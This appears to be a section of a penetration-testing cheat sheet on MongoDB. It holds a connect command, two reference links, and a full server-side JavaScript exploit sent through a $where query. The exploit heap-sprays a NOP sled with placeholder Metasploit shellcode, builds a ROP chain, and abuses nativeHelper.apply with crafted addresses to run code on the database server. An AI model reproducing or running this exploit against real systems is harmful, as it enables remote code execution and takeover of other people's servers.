## MongoDB

### Connect

```
mongo -p -u $USER $DB_NAME
```

<https://cxsecurity.com/issue/WLB-2013030212>

```javascript
db.my_collection.find({'$where':'shellcode=unescape("METASPLOIT JS GENERATED SHELLCODE"); sizechunk=0x1000; chunk=""; for(i=0;i<sizechunk;i++){ chunk+=unescape("%u9090%u9090"); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i<25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape("%uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000"); sizechunk2=0x1000; chunk2=""; for(i=0;i<sizechunk2;i++){ chunk2+=unescape("%u5a70%u0805"); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i<25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({"x" : 0x836e204}, ["A"+"\x26\x18\x35\x08"+"MongoSploit!"+"\x58\x71\x45\x08"+"sthack is a nice place to be"+"\x6c\x5a\x05\x08"+"\x20\x20\x20\x20"+"\x58\x71\x45\x08"]);'})
```

<https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html>

